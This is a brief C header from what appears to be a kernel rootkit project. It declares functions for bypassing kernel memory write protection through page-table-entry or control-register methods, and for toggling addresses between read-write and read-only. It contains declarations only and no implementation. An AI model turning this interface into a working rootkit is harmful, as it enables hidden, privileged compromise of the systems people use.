#ifndef ROOTKIT_MEMORY_H
# define ROOTKIT_MEMORY_H

enum memory_prot_bypass_method {
    MEM_PTE,
    MEM_CR,
};

void memory_prot_bypass(enum memory_prot_bypass_method m);
void set_addr_rw(void *addr);
void set_addr_ro(void *addr);


#endif /* !ROOTKIT_MEMORY_H */
